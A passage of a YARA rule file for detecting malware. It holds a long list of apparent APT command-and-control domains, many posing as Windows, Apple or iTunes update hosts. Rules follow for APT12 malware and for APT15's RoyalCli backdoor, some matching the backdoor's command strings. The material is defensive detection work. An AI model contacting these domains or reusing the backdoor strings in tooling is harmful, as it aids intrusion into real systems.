\"windowsstores.organiccrap.com\" ascii\n        $c2_959 = \"windowsupdate.2waky.com\" ascii\n        $c2_960 = \"windowsupdate.3-a.net\" ascii\n        $c2_961 = \"windowsupdate.acmetoy.com\" ascii\n        $c2_962 = \"windowsupdate.authorizeddns.net\" ascii\n        $c2_963 = \"windowsupdate.authorizeddns.org\" ascii\n        $c2_964 = \"windowsupdate.authorizeddns.us\" ascii\n        $c2_965 = \"windowsupdate.com.mwcname.com\" ascii\n        $c2_966 = \"windowsupdate.dedgesuite.net\" ascii\n        $c2_967 = \"windowsupdate.dns05.com\" ascii\n        $c2_968 = \"windowsupdate.dnset.com\" ascii\n        $c2_969 = \"windowsupdate.esmtp.biz\" ascii\n        $c2_970 = \"windowsupdate.ezua.com\" ascii\n        $c2_971 = \"windowsupdate.fartit.com\" ascii\n        $c2_972 = \"windowsupdate.gettrials.com\" ascii\n        $c2_973 = \"windowsupdate.instanthq.com\" ascii\n        $c2_974 = \"windowsupdate.itsaol.com\" ascii\n        $c2_975 = \"windowsupdate.jungleheart.com\" ascii\n        $c2_976 = \"windowsupdate.lflink.com\" ascii\n        $c2_977 = \"windowsupdate.mrface.com\" ascii\n        $c2_978 = \"windowsupdate.mylftv.com\" ascii\n        $c2_979 = \"windowsupdate.nsatcdns.com\" ascii\n        $c2_980 = \"windowsupdate.organiccrap.com\" ascii\n        $c2_981 = \"windowsupdate.rebatesrule.net\" ascii\n        $c2_982 = \"windowsupdate.sellclassics.com\" ascii\n        $c2_983 = \"windowsupdate.serveusers.com\" ascii\n        $c2_984 = \"windowsupdate.vizvaz.com\" ascii\n        $c2_985 = \"windowsupdate.wcwname.com\" ascii\n        $c2_986 = \"windowsupdate.x24hr.com\" ascii\n        $c2_987 = \"windowsupdate.ygto.com\" ascii\n        $c2_988 = \"windowsupdates.dnset.com\" ascii\n        $c2_989 = \"windowsupdates.ezua.com\" ascii\n        $c2_990 = \"windowsupdates.ikwb.com\" ascii\n        $c2_991 = \"windowsupdates.itemdb.com\" ascii\n        $c2_992 = \"windowsupdates.proxydns.com\" ascii\n        $c2_993 = \"workerisgood.com\" ascii\n        $c2_994 = \"woyaofanwen.com\" ascii\n        $c2_995 = \"wschandler.com\" ascii\n        $c2_996 = \"wthelpdesk.com\" ascii\n        $c2_997 = \"wubangtu.info\" ascii\n        $c2_998 = \"www-meti-go-jp.tyoto-go-jp.com\" ascii\n        $c2_999 = \"www.2014.zzux.com\" ascii\n        $c2_1000 = \"www.97sm.com\" ascii\n        $c2_1001 = \"www.9gowg.tech\" ascii\n        $c2_1002 = \"www.abdominal.faqserv.com\" ascii\n        $c2_1003 = \"www.additional.sexidude.com\" ascii\n        $c2_1004 = \"www.afc.https443.org\" ascii\n        $c2_1005 = \"www.androidmusicapp.onmypc.us\" ascii\n        $c2_1006 = \"www.announcements.toythieves.com\" ascii\n        $c2_1007 = \"www.anx-own-334.mrbasic.com\" ascii\n        $c2_1008 = \"www.apple.ikwb.com\" ascii\n        $c2_1009 = \"www.appledownload.ourhobby.com\" ascii\n        $c2_1010 = \"www.appleimages.itemdb.com\" ascii\n        $c2_1011 = \"www.appleimages.longmusic.com\" ascii\n        $c2_1012 = \"www.appleimages.organiccrap.com\" ascii\n        $c2_1013 = \"www.applejuice.itemdb.com\" ascii\n        $c2_1014 = \"www.applemirror.organiccrap.com\" ascii\n        $c2_1015 = \"www.applemirror.squirly.info\" ascii\n        $c2_1016 = \"www.applemusic.isasecret.com\" ascii\n        $c2_1017 = \"www.applemusic.itemdb.com\" ascii\n        $c2_1018 = \"www.applemusic.wikaba.com\" ascii\n        $c2_1019 = \"www.applemusic.xxuz.com\" ascii\n        $c2_1020 = \"www.applemusic.zzux.com\" ascii\n        $c2_1021 = \"www.appleupdate.itemdb.com\" ascii\n        $c2_1022 = \"www.appleupdateurl.2waky.com\" ascii\n        $c2_1023 = \"www.architectisusa.com\" ascii\n        $c2_1024 = \"www.army.xxuz.com\" ascii\n        $c2_1025 = \"www.art.p6p6.net\" ascii\n        $c2_1026 = \"www.asfzx.x24hr.com\" ascii\n        $c2_1027 = \"www.availab.wikaba.com\" ascii\n        $c2_1028 = \"www.availability.justdied.com\" ascii\n        $c2_1029 = \"www.babymusicsitetr.mymom.info\" ascii\n        $c2_1030 = \"www.back.jungleheart.com\" ascii\n        $c2_1031 = \"www.balance1.wikaba.com\" ascii\n        $c2_1032 = \"www.be.mrslove.com\" ascii\n        $c2_1033 = \"www.belowto.com\" ascii\n        $c2_1034 = \"www.billing.organiccrap.com\" ascii\n        $c2_1035 = \"www.blaaaaaaaaaaaa.windowsupdate.3-a.net\" ascii\n        $c2_1036 = \"www.brand.fartit.com\" ascii\n        $c2_1037 = \"www.bulletproof.squirly.info\" ascii\n        $c2_1038 = \"www.cabbage.iownyour.biz\" ascii\n        $c2_1039 = \"www.ccupdatedata.authorizeddns.net\" ascii\n        $c2_1040 = \"www.cdn.incloud-go.com\" ascii\n        $c2_1041 = \"www.center.shenajou.com\" ascii\n        $c2_1042 = \"www.chaindungeons.com\" ascii\n        $c2_1043 = \"www.cia.ezua.com\" ascii\n        $c2_1044 = \"www.cia.toh.info\" ascii\n        $c2_1045 = \"www.civilwar123.authorizeddns.org\" ascii\n        $c2_1046 = \"www.civilwar520.onmypc.org\" ascii\n        $c2_1047 = \"www.cloud-maste.com\" ascii\n        $c2_1048 = \"www.cnnews.mylftv.com\" ascii\n        $c2_1049 = \"www.commissioner.shenajou.com\" ascii\n        $c2_1050 = \"www.commons.onedumb.com\" ascii\n        $c2_1051 = \"www.contractus.qpoe.com\" ascii\n        $c2_1052 = \"www.corp-dnsonline.itsaol.com\" ascii\n        $c2_1053 = \"www.courier.jetos.com\" ascii\n        $c2_1054 = \"www.cress.mynetav.net\" ascii\n        $c2_1055 = \"www.ctdl.windowsupdate.nsatcdns.com\" ascii\n        $c2_1056 = \"www.ctldl.microsoftupdate.qhigh.com\" ascii\n        $c2_1057 = \"www.ctldl.windowsupdate.authorizeddns.us\" ascii\n        $c2_1058 = \"www.ctldl.windowsupdate.esmtp.biz\" ascii\n        $c2_1059 = \"www.ctldl.windowsupdate.mrface.com\" ascii\n        $c2_1060 = \"www.cwiinatonal.com\" ascii\n        $c2_1061 = \"www.dasoftactivemodule.toythieves.com\" ascii\n        $c2_1062 = \"www.dasonews.youdontcare.com\" ascii\n        $c2_1063 = \"www.daughter.vizvaz.com\" ascii\n        $c2_1064 = \"www.de.onmypc.info\" ascii\n        $c2_1065 = \"www.details.squirly.info\" ascii\n        $c2_1066 = \"www.development.shenajou.com\" ascii\n        $c2_1067 = \"www.devilcase.acmetoy.com\" ascii\n        $c2_1068 = \"www.disruptive.https443.net\" ascii\n        $c2_1069 = \"www.dns-hinettw.25u.com\" ascii\n        $c2_1070 = \"www.document.shenajou.com\" ascii\n        $c2_1071 = \"www.domainnow.yourtrap.com\" ascii\n        $c2_1072 = \"www.download.windowsupdate.nsatcdns.com\" ascii\n        $c2_1073 = \"www.ea.onmypc.info\" ascii\n        $c2_1074 = \"www.eddo.qpoe.com\" ascii\n        $c2_1075 = \"www.ehshiroshima.mylftv.com\" ascii\n        $c2_1076 = \"www.eric-averyanov.wha.la\" ascii\n        $c2_1077 = \"www.eu.acmetoy.com\" ascii\n        $c2_1078 = \"www.eu.wha.la\" ascii\n        $c2_1079 = \"www.express.lflinkup.com\" ascii\n        $c2_1080 = \"www.extraordinary.dynamic-dns.net\" ascii\n        $c2_1081 = \"www.f068v.site\" ascii\n        $c2_1082 = \"www.facefile.fartit.com\" ascii\n        $c2_1083 = \"www.fertile.authorizeddns.net\" ascii\n        $c2_1084 = \"www.file.zzux.com\" ascii\n        $c2_1085 = \"www.findme.epac.to\" ascii\n        $c2_1086 = \"www.fire.mrface.com\" ascii\n        $c2_1087 = \"www.firstnews.jkub.com\" ascii\n        $c2_1088 = \"www.fjs.wikaba.com\" ascii\n        $c2_1089 = \"www.foal.wchildress.com\" ascii\n        $c2_1090 = \"www.fr.wikaba.com\" ascii\n        $c2_1091 = \"www.freegamecenter.onedumb.com\" ascii\n        $c2_1092 = \"www.fruit.qhigh.com\" ascii\n        $c2_1093 = \"www.fuck.ikwb.com\" ascii\n        $c2_1094 = \"www.fuckmm.dns-dns.com\" ascii\n        $c2_1095 = \"www.fukuoka.cloud-maste.com\" ascii\n        $c2_1096 = \"www.g3ypf.online\" ascii\n        $c2_1097 = \"www.garlic.dyndns.pro\" ascii\n        $c2_1098 = \"www.generat.almostmy.com\" ascii\n        $c2_1099 = \"www.glicense.shenajou.com\" ascii\n        $c2_1100 = \"www.goldtoyota.com\" ascii\n        $c2_1101 = \"www.goodmusic.justdied.com\" ascii\n        $c2_1102 = \"www.gooesdataios.instanthq.com\" ascii\n        $c2_1103 = \"www.grammar.jkub.com\" ascii\n        $c2_1104 = \"www.helpus.ddns.info\" ascii\n        $c2_1105 = \"www.hii.qhigh.com\" ascii\n        $c2_1106 = \"www.hinetonlinedns.dns05.com\" ascii\n        $c2_1107 = \"www.incloud-go.com\" ascii\n        $c2_1108 = \"www.innocent-isayev.sexidude.com\" ascii\n        $c2_1109 = \"www.interpreter.shenajou.com\" ascii\n        $c2_1110 = \"www.invoices.sexxxy.biz\" ascii\n        $c2_1111 = \"www.iphone.vizvaz.com\" ascii\n        $c2_1112 = \"www.ipv4.microsoftupdate.mrbasic.com\" ascii\n        $c2_1113 = \"www.ipv4.windowsupdate.3-a.net\" ascii\n        $c2_1114 = \"www.ipv4.windowsupdate.esmtp.biz\" ascii\n        $c2_1115 = \"www.ipv4.windowsupdate.fartit.com\" ascii\n        $c2_1116 = \"www.ipv4.windowsupdate.lflink.com\" ascii\n        $c2_1117 = \"www.ipv4.windowsupdate.mrface.com\" ascii\n        $c2_1118 = \"www.ipv4.windowsupdate.mylftv.com\" ascii\n        $c2_1119 = \"www.ipv4.windowsupdate.nsatcdns.com\" ascii\n        $c2_1120 = \"www.itlans.isasecret.com\" ascii\n        $c2_1121 = \"www.itunesdownload.jkub.com\" ascii\n        $c2_1122 = \"www.itunesdownload.vizvaz.com\" ascii\n        $c2_1123 = \"www.itunesdownload.wikaba.com\" ascii\n        $c2_1124 = \"www.itunesimages.itemdb.com\" ascii\n        $c2_1125 = \"www.itunesimages.itsaol.com\" ascii\n        $c2_1126 = \"www.itunesimages.qpoe.com\" ascii\n        $c2_1127 = \"www.itunesmirror.fartit.com\" ascii\n        $c2_1128 = \"www.itunesmirror.itsaol.com\" ascii\n        $c2_1129 = \"www.itunesmusic.ikwb.com\" ascii\n        $c2_1130 = \"www.itunesmusic.jetos.com\" ascii\n        $c2_1131 = \"www.itunesmusic.jkub.com\" ascii\n        $c2_1132 = \"www.itunesmusic.zzux.com\" ascii\n        $c2_1133 = \"www.itunesupdate.itsaol.com\" ascii\n        $c2_1134 = \"www.itunesupdates.organiccrap.com\" ascii\n        $c2_1135 = \"www.japanenvnews.qpoe.com\" ascii\n        $c2_1136 = \"www.jd978.com\" ascii\n        $c2_1137 = \"www.jimin.jimindaddy.com\" ascii\n        $c2_1138 = \"www.jimin.mymom.info\" ascii\n        $c2_1139 = \"www.jp.serveuser.com\" ascii\n        $c2_1140 = \"www.jpnappstore.ourhobby.com\" ascii\n        $c2_1141 = \"www.jpnewslogs.sendsmtp.com\" ascii\n        $c2_1142 = \"www.jpnxzshopdata.authorizeddns.org\" ascii\n        $c2_1143 = \"www.kawasaki.cloud-maste.com\" ascii\n        $c2_1144 = \"www.kawasaki.unhamj.com\" ascii\n        $c2_1145 = \"www.key.zzux.com\" ascii\n        $c2_1146 = \"www.knowledge.sellclassics.com\" ascii\n        $c2_1147 = \"www.lan.dynssl.com\" ascii\n        $c2_1148 = \"www.last.p6p6.net\" ascii\n        $c2_1149 = \"www.latestnews.epac.to\" ascii\n        $c2_1150 = \"www.latestnews.organiccrap.com\" ascii\n        $c2_1151 = \"www.leedong.longmusic.com\" ascii\n        $c2_1152 = \"www.leeks.mrbonus.com\" ascii\n        $c2_1153 = \"www.liberty.acmetoy.com\" ascii\n        $c2_1154 = \"www.license.shenajou.com\" ascii\n        $c2_1155 = \"www.lion.wchildress.com\" ascii\n        $c2_1156 = \"www.loveddos.com\" ascii\n        $c2_1157 = \"www.macfee.mrface.com\" ascii\n        $c2_1158 = \"www.macforlinux.net\" ascii\n        $c2_1159 = \"www.maffc.mrface.com\" ascii\n        $c2_1160 = \"www.malware.dsmtp.com\" ascii\n        $c2_1161 = \"www.manager.jetos.com\" ascii\n        $c2_1162 = \"www.markabcinfo.dynamicdns.me.uk\" ascii\n        $c2_1163 = \"www.mason.vizvaz.com\" ascii\n        $c2_1164 = \"www.mediapath.organiccrap.com\" ascii\n        $c2_1165 = \"www.meiji-ac-jp.com\" ascii\n        $c2_1166 = \"www.messagea.emailfound.info\" ascii\n        $c2_1167 = \"www.microsoft.got-game.org\" ascii\n        $c2_1168 = \"www.microsoft.mrface.com\" ascii\n        $c2_1169 = \"www.microsoftempowering.sendsmtp.com\" ascii\n        $c2_1170 = \"www.microsoftgame.mrface.com\" ascii\n        $c2_1171 = \"www.microsoftgetstarted.sexidude.com\" ascii\n        $c2_1172 = \"www.microsoftimages.organiccrap.com\" ascii\n        $c2_1173 = \"www.microsoftmirror.mrbasic.com\" ascii\n        $c2_1174 = \"www.microsoftmusic.itemdb.com\" ascii\n        $c2_1175 = \"www.microsoftmusic.mrbasic.com\" ascii\n        $c2_1176 = \"www.microsoftqckmanager.pcanywhere.net\" ascii\n        $c2_1177 = \"www.microsoftupdate.mrbasic.com\" ascii\n        $c2_1178 = \"www.microsoftupdate.qhigh.com\" ascii\n        $c2_1179 = \"www.micrsoftware.dsmtp.com\" ascii\n        $c2_1180 = \"www.mircsoft.compress.to\" ascii\n        $c2_1181 = \"www.mmy.ddns.us\" ascii\n        $c2_1182 = \"www.mod.jetos.com\" ascii\n        $c2_1183 = \"www.mofa.dynamic-dns.net\" ascii\n        $c2_1184 = \"www.mofa.ns01.info\" ascii\n        $c2_1185 = \"www.moonnightthse.zyns.com\" ascii\n        $c2_1186 = \"www.moscowdic.trickip.org\" ascii\n        $c2_1187 = \"www.moscowstdsupdate.toythieves.com\" ascii\n        $c2_1188 = \"www.mseupdate.ourhobby.com\" ascii\n        $c2_1189 = \"www.msg.ezua.com\" ascii\n        $c2_1190 = \"www.msn.incloud-go.com\" ascii\n        $c2_1191 = \"www.musicfile.ikwb.com\" ascii\n        $c2_1192 = \"www.musicjj.zzux.com\" ascii\n        $c2_1193 = \"www.musicsecph.squirly.info\" ascii\n        $c2_1194 = \"www.mymusicbox.lflinkup.org\" ascii\n        $c2_1195 = \"www.mymusicbox.vizvaz.com\" ascii\n        $c2_1196 = \"www.myrestroomimage.isasecret.com\" ascii\n        $c2_1197 = \"www.mytwhomeinst.sendsmtp.com\" ascii\n        $c2_1198 = \"www.myurinikoreaaps.ninth.biz\" ascii\n        $c2_1199 = \"www.na.americanunfinished.com\" ascii\n        $c2_1200 = \"www.na.onmypc.org\" ascii\n        $c2_1201 = \"www.networkjpnzee.mynetav.org\" ascii\n        $c2_1202 = \"www.newcityoforward.rebatesrule.net\" ascii\n        $c2_1203 = \"www.newdnssec-info.4mydomain.com\" ascii\n        $c2_1204 = \"www.newsdata.jkub.com\" ascii\n        $c2_1205 = \"www.newsfile.toythieves.com\" ascii\n        $c2_1206 = \"www.newsroom.cleansite.info\" ascii\n        $c2_1207 = \"www.nlddnsinfo.https443.org\" ascii\n        $c2_1208 = \"www.no.authorizeddns.org\" ascii\n        $c2_1209 = \"www.nposnewsinfo.qhigh.com\" ascii\n        $c2_1210 = \"www.nsa.mefound.com\" ascii\n        $c2_1211 = \"www.nt.mynumber.org\" ascii\n        $c2_1212 = \"www.nttdata.otzo.com\" ascii\n        $c2_1213 = \"www.nuisance.serveusers.com\" ascii\n        $c2_1214 = \"www.nz.compress.to\" ascii\n        $c2_1215 = \"www.ol.almostmy.com\" ascii\n        $c2_1216 = \"www.oldbmwy.com\" ascii\n        $c2_1217 = \"www.onion.jkub.com\" ascii\n        $c2_1218 = \"www.onlinednsserver.sendsmtp.com\" ascii\n        $c2_1219 = \"www.oracleupdate.dns04.com\" ascii\n        $c2_1220 = \"www.oyster.jkub.com\" ascii\n        $c2_1221 = \"www.p6p6.net\" ascii\n        $c2_1222 = \"www.packetsdsquery.dns05.com\" ascii\n        $c2_1223 = \"www.pepper.sexxxy.biz\" ascii\n        $c2_1224 = \"www.phptecinfohelp.itemdb.com\" ascii\n        $c2_1225 = \"www.pickled.myddns.com\" ascii\n        $c2_1226 = \"www.polopurple.com\" ascii\n        $c2_1227 = \"www.portal.mrface.com\" ascii\n        $c2_1228 = \"www.portal.sendsmtp.com\" ascii\n        $c2_1229 = \"www.portalser.dynamic-dns.net\" ascii\n        $c2_1230 = \"www.praskovya-matveyeva.mefound.com\" ascii\n        $c2_1231 = \"www.praskovya-ulyanova.dumb1.com\" ascii\n        $c2_1232 = \"www.products.almostmy.com\" ascii\n        $c2_1233 = \"www.products.cleansite.us\" ascii\n        $c2_1234 = \"www.products.serveuser.com\" ascii\n        $c2_1235 = \"www.purchase.lflinkup.org\" ascii\n        $c2_1236 = \"www.rainbow.mypop3.org\" ascii\n        $c2_1237 = \"www.re26.com\" ascii\n        $c2_1238 = \"www.read.xxuz.com\" ascii\n        $c2_1239 = \"www.recent.dns-stuff.com\" ascii\n        $c2_1240 = \"www.recent.fartit.com\" ascii\n        $c2_1241 = \"www.redflower.isasecret.com\" ascii\n        $c2_1242 = \"www.referred.gr8domain.biz\" ascii\n        $c2_1243 = \"www.referred.yourtrap.com\" ascii\n        $c2_1244 = \"www.register.ourhobby.com\" ascii\n        $c2_1245 = \"www.registration2.instanthq.com\" ascii\n        $c2_1246 = \"www.registrations.4pu.com\" ascii\n        $c2_1247 = \"www.registrations.organiccrap.com\" ascii\n        $c2_1248 = \"www.remeberdata.iownyour.org\" ascii\n        $c2_1249 = \"www.reserveds.onedumb.com\" ascii\n        $c2_1250 = \"www.rethem.almostmy.com\" ascii\n        $c2_1251 = \"www.rg197.win\" ascii\n        $c2_1252 = \"www.sakai.unhamj.com\" ascii\n        $c2_1253 = \"www.sapporo.cloud-maste.com\" ascii\n        $c2_1254 = \"www.sauerkraut.sellclassics.com\" ascii\n        $c2_1255 = \"www.saverd.re26.com\" ascii\n        $c2_1256 = \"www.sbuudd.webssl9.info\" ascii\n        $c2_1257 = \"www.sdmsg.onmypc.org\" ascii\n        $c2_1258 = \"www.se.toythieves.com\" ascii\n        $c2_1259 = \"www.secertnews.mrbasic.com\" ascii\n        $c2_1260 = \"www.secnetshit.com\" ascii\n        $c2_1261 = \"www.secserverupdate.toh.info\" ascii\n        $c2_1262 = \"www.senseye.ikwb.com\" ascii\n        $c2_1263 = \"www.senseye.mrbonus.com\" ascii\n        $c2_1264 = \"www.septdlluckysystem.jungleheart.com\" ascii\n        $c2_1265 = \"www.seraphim-yurieva.justdied.com\" ascii\n        $c2_1266 = \"www.serv.justdied.com\" ascii\n        $c2_1267 = \"www.server1.proxydns.com\" ascii\n        $c2_1268 = \"www.seyesb.acmetoy.com\" ascii\n        $c2_1269 = \"www.showy.almostmy.com\" ascii\n        $c2_1270 = \"www.shugiin.jkub.com\" ascii\n        $c2_1271 = \"www.sindeali.com\" ascii\n        $c2_1272 = \"www.singed.otzo.com\" ascii\n        $c2_1273 = \"www.sojourner.mypicture.info\" ascii\n        $c2_1274 = \"www.sstday.jkub.com\" ascii\n        $c2_1275 = \"www.support1.mrface.com\" ascii\n        $c2_1276 = \"www.supportus.mefound.com\" ascii\n        $c2_1277 = \"www.svc.dynssl.com\" ascii\n        $c2_1278 = \"www.sweetheart.sexxxy.biz\" ascii\n        $c2_1279 = \"www.synssl.dnset.com\" ascii\n        $c2_1280 = \"www.tamraj.fartit.com\" ascii\n        $c2_1281 = \"www.telegraph.mefound.com\" ascii\n        $c2_1282 = \"www.tfa.longmusic.com\" ascii\n        $c2_1283 = \"www.thunder.wikaba.com\" ascii\n        $c2_1284 = \"www.ticket.instanthq.com\" ascii\n        $c2_1285 = \"www.ticket.serveuser.com\" ascii\n        $c2_1286 = \"www.tisupdateinfo.faqserv.com\" ascii\n        $c2_1287 = \"www.tokyofile.2waky.com\" ascii\n        $c2_1288 = \"www.tophost.dynamicdns.co.uk\" ascii\n        $c2_1289 = \"www.transfer.lflinkup.org\" ascii\n        $c2_1290 = \"www.transfer.mrbasic.com\" ascii\n        $c2_1291 = \"www.transfer.vizvaz.com\" ascii\n        $c2_1292 = \"www.twgovernmentinfo.acmetoy.com\" ascii\n        $c2_1293 = \"www.twsslpopservupro.dynssl.com\" ascii\n        $c2_1294 = \"www.ugreen.itemdb.com\" ascii\n        $c2_1295 = \"www.uk.dynamicdns.org.uk\" ascii\n        $c2_1296 = \"www.un.ddns.info\" ascii\n        $c2_1297 = \"www.un.dnsrd.com\" ascii\n        $c2_1298 = \"www.unhamj.com\" ascii\n        $c2_1299 = \"www.usa.itsaol.com\" ascii\n        $c2_1300 = \"www.usffunicef.com\" ascii\n        $c2_1301 = \"www.usliveupdateonline.ygto.com\" ascii\n        $c2_1302 = \"www.ut-portal-u-tokyo-ac-jp.tyoto-go-jp.com\" ascii\n        $c2_1303 = \"www.v4.windowsupdate.mrface.com\" ascii\n        $c2_1304 = \"www.v4.windowsupdate.nsatcdns.com\" ascii\n        $c2_1305 = \"www.vmmini.com\" ascii\n        $c2_1306 = \"www.wchildress.com\" ascii\n        $c2_1307 = \"www.webdirectnews.dynamicdns.biz\" ascii\n        $c2_1308 = \"www.webmailentry.jetos.com\" ascii\n        $c2_1309 = \"www.websqlnewsmanager.ninth.biz\" ascii\n        $c2_1310 = \"www.well.itsaol.com\" ascii\n        $c2_1311 = \"www.well.mrbasic.com\" ascii\n        $c2_1312 = \"www.windowfile.itemdb.com\" ascii\n        $c2_1313 = \"www.windowsimages.itemdb.com\" ascii\n        $c2_1314 = \"www.windowsimages.qhigh.com\" ascii\n        $c2_1315 = \"www.windowsmirrors.vizvaz.com\" ascii\n        $c2_1316 = \"www.windowsupdate.2waky.com\" ascii\n        $c2_1317 = \"www.windowsupdate.3-a.net\" ascii\n        $c2_1318 = \"www.windowsupdate.acmetoy.com\" ascii\n        $c2_1319 = \"www.windowsupdate.authorizeddns.net\" ascii\n        $c2_1320 = \"www.windowsupdate.authorizeddns.org\" ascii\n        $c2_1321 = \"www.windowsupdate.authorizeddns.us\" ascii\n        $c2_1322 = \"www.windowsupdate.dns05.com\" ascii\n        $c2_1323 = \"www.windowsupdate.dnset.com\" ascii\n        $c2_1324 = \"www.windowsupdate.esmtp.biz\" ascii\n        $c2_1325 = \"www.windowsupdate.ezua.com\" ascii\n        $c2_1326 = \"www.windowsupdate.fartit.com\" ascii\n        $c2_1327 = \"www.windowsupdate.gettrials.com\" ascii\n        $c2_1328 = \"www.windowsupdate.instanthq.com\" ascii\n        $c2_1329 = \"www.windowsupdate.itsaol.com\" ascii\n        $c2_1330 = \"www.windowsupdate.jungleheart.com\" ascii\n        $c2_1331 = \"www.windowsupdate.lflink.com\" ascii\n        $c2_1332 = \"www.windowsupdate.mrface.com\" ascii\n        $c2_1333 = \"www.windowsupdate.mylftv.com\" ascii\n        $c2_1334 = \"www.windowsupdate.nsatcdns.com\" ascii\n        $c2_1335 = \"www.windowsupdate.organiccrap.com\" ascii\n        $c2_1336 = \"www.windowsupdate.rebatesrule.net\" ascii\n        $c2_1337 = \"www.windowsupdate.sellclassics.com\" ascii\n        $c2_1338 = \"www.windowsupdate.serveusers.com\" ascii\n        $c2_1339 = \"www.windowsupdate.x24hr.com\" ascii\n        $c2_1340 = \"www.yahoo.incloud-go.com\" ascii\n        $c2_1341 = \"www.yandexr.sellclassics.com\" ascii\n        $c2_1342 = \"www.yeahyeahyeahs.3322.org\" ascii\n        $c2_1343 = \"www.yokohamajpinstaz.mrbonus.com\" ascii\n        $c2_1344 = \"www.zaigawebinfo.rebatesrule.net\" ascii\n        $c2_1345 = \"www.zebra.incloud-go.com\" ascii\n        $c2_1346 = \"www2.qpoe.com\" ascii\n        $c2_1347 = \"www2.zyns.com\" ascii\n        $c2_1348 = \"www2.zzux.com\" ascii\n        $c2_1349 = \"x7.usyahooapis.com\" ascii\n        $c2_1350 = \"xi.dyndns.pro\" ascii\n        $c2_1351 = \"xi.sexxxy.biz\" ascii\n        $c2_1352 = \"xread10821.9966.org\" ascii\n        $c2_1353 = \"xsince.tk\" ascii\n        $c2_1354 = \"xt.dnset.com\" ascii\n        $c2_1355 = \"xyrn998754.2288.org\" ascii\n        $c2_1356 = \"yahoo.incloud-go.com\" ascii\n        $c2_1357 = \"yallago.cu.cc\" ascii\n        $c2_1358 = \"yandexr.sellclassics.com\" ascii\n        $c2_1359 = \"yeahyeahyeahs.3322.org\" ascii\n        $c2_1360 = \"yeap1.jumpingcrab.com\" ascii\n        $c2_1361 = \"yfrfyhf.youdontcare.com\" ascii\n        $c2_1362 = \"yo.acmetoy.com\" ascii\n        $c2_1363 = \"za.myftp.info\" ascii\n        $c2_1364 = \"zabbix.servercontrols.pw\" ascii\n        $c2_1365 = \"zaigawebinfo.rebatesrule.net\" ascii\n        $c2_1367 = \"zebra.UsFfUnicef.com\" ascii\n        $c2_1368 = \"zebra.bdoncloud.com\" ascii\n        $c2_1369 = \"zebra.incloud-go.com\" ascii\n        $c2_1370 = \"zebra.unhamj.com\" ascii\n        $c2_1371 = \"zebra.wthelpdesk.com\" ascii\n        $c2_1372 = \"zero.pcanywhere.net\" ascii\n        $c2_1373 = \"zg.ns02.biz\" ascii\n        $c2_1374 = \"zone.demoones.com\" ascii\n\n    condition:\n        1 of ($c2_*)\n}\n\nrule APT12_Malware_Aug17\n{\n    meta:\n        description = \"APT12 malware\"\n        threat_names = \"APT12\"\n        ref = \"http://blog.macnica.net/blog/2017/08/post-fb81.html\"\n        vti_default_score = 5\n        vti_documents_score = 5\n        vti_scripts_score = 5\n        vti_browser_score = 5\n        vti_msi_score = 5\n        vti_static_score = 5\n        author = \"Florian Roth\"\n        source = \"https://github.com/Neo23x0/signature-base\"\n        original_name = \"APT12_Malware_Aug17\"\n        license = \"GPL-3.0 (https://opensource.org/licenses/GPL-3.0)\"\n\n    condition:\n        (uint16(0) == 0x5a4d and pe.imphash() == \"9ba915fd04f248ad62e856c7238c0264\")\n}\n\nrule APT15_clean_apt15_patchedcmd\n{\n    meta:\n        description = \"Patched cmd.exe used by RoyalCli\"\n        threat_names = \"RoyalCli, APT15\"\n        ref = \"https://www.nccgroup.trust/us/about-us/newsroom-and-events/blog/2018/march/apt15-is-alive-and-strong-an-analysis-of-royalcli-and-royaldns/\"\n        vti_default_score = 5\n        vti_documents_score = 5\n        vti_scripts_score = 5\n        vti_browser_score = 5\n        vti_msi_score = 5\n        vti_static_score = 5\n        author = \"Ahmed Zaki\"\n        source = \"https://github.com/Yara-Rules/rules\"\n        original_name = \"clean_apt15_patchedcmd\"\n        license = \"GPL-2.0 (https://opensource.org/licenses/GPL-2.0)\"\n\n    strings:\n        $ = \"eisableCMD\" wide\n        $ = \"%WINDOWS_COPYRIGHT%\" wide\n        $ = \"Cmd.Exe\" wide\n        $ = \"Windows Command Processor\" wide\n\n    condition:\n        uint16(0) == 0x5A4D and all of them\n}\n\nrule APT15_malware_apt15_royalcli_1\n{\n    meta:\n        description = \"Generic strings found in the RoyalCli tool\"\n        threat_names = \"RoyalCli, APT15\"\n        ref = \"https://www.nccgroup.trust/us/about-us/newsroom-and-events/blog/2018/march/apt15-is-alive-and-strong-an-analysis-of-royalcli-and-royaldns/\"\n        vti_default_score = 5\n        vti_documents_score = 5\n        vti_scripts_score = 5\n        vti_browser_score = 5\n        vti_msi_score = 5\n        vti_static_score = 5\n        author = \"David Cannings\"\n        source = \"https://github.com/Yara-Rules/rules\"\n        original_name = \"malware_apt15_royalcli_1\"\n        license = \"GPL-2.0 (https://opensource.org/licenses/GPL-2.0)\"\n\n    strings:\n        $ = \"%s~clitemp%08x.tmp\" fullword\n        $ = \"qg.tmp\" fullword\n        $ = \"%s /c %s>%s\" fullword\n        $ = \"hkcmd.exe\" fullword\n        $ = \"%snewcmd.exe\" fullword\n        $ = \"%shkcmd.exe\" fullword\n        $ = \"%s~clitemp%08x.ini\" fullword\n        $ = \"myRObject\" fullword\n        $ = \"myWObject\" fullword\n        $ = \"10 %d %x\\x0D\\x0A\"\n        $ = \"4 %s  %d\\x0D\\x0A\"\n        $ = \"6 %s  %d\\x0D\\x0A\"\n        $ = \"1 %s  %d\\x0D\\x0A\"\n        $ = \"3 %s  %d\\x0D\\x0A\"\n        $ = \"5 %s  %d\\x0D\\x0A\"\n        $ = \"2 %s  %d 0 %d\\x0D\\x0A\"\n        $ = \"2 %s  %d 1 %d\\x0D\\x0A\"\n        $ = \"%s file not exist\" fullword\n\n    condition:\n        uint16(0) == 0x5A4D and 5 of them\n}\n\nrule APT15_malware_apt15_royalcli_2\n{\n    meta:\n        description = \"APT15 RoyalCli backdoor\"\n        threat_names = \"RoyalCli, APT15\"\n        ref = \"https://www.nccgroup.trust/us/about-us/newsroom-and-events/blog/2018/march/apt15-is-alive-and-strong-an-analysis-of-royalcli-and-royaldns/\"\n        vti_default_score = 5\n        vti_documents_score = 5\n        vti_scripts_score = 5\n        vti_browser_score = 5\n        vti_msi_score = 5\n        vti_static_score = 5\n        author = \"Nikolaos Pantazopoulos\"\n        source = \"https://github.com/Yara-Rules/rules\"\n        original_name = \"malware_apt15_royalcli_2\"\n        license = \"GPL-2.0 (https://opensource.org/licenses/GPL-2.0)\"\n\n    strings:\n        $string1 = \"%shkcmd.exe\" fullword\n        $string2 = \"myRObject\" fullword\n        $string3 = \"%snewcmd.exe\" fullword\n        $string4 = 